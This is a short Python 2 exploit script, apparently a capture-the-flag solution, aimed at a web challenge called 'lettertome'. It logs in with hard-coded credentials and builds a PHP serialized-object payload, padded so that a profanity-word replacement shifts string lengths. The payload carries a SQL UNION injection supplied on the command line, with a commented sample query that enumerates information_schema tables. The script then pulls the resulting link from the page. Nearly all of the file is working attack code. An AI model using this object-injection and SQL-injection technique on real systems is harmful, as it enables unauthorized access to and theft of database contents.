import requests

import re
import sys

'''
select table_name,1 from information_schema.tables LIMIT 61,1
'''

if len(sys.argv) < 2:
    print 'ERROR: put injection code on argv[1]'
    exit(0)

template = 'bi**h";s:13:"attached_file";s:{}:"{}-1 union {}";}}'

space = ''

file_len = 9 + len(sys.argv[1])
all_len = 46 + len(sys.argv[1])

num_buf = 5 - all_len % 5
space = ' ' * num_buf
file_len += num_buf
all_len += num_buf

if file_len > 100:
    space = space[:-1]
    file_len -= 1
    all_len -= 1
elif file_len == 100:
    space = space + '     '
    file_len += 5
    all_len += 5

profanity_len = all_len / 5

payload = template.format(file_len, space, sys.argv[1])


s = requests.Session()

s.get('http://lettertome.eatpwnnosleep.com/?page=login&id=qwazqwaz3&pw=12345678')
s.get('http://lettertome.eatpwnnosleep.com/?page=send&letter={}&profanity_word_replace={}'.format(
    payload, 'a'*profanity_len
))
r = s.get('http://lettertome.eatpwnnosleep.com/?page=show')

print re.findall('<a href="(.*?)" download="(.*?)">', r.content)[-1]
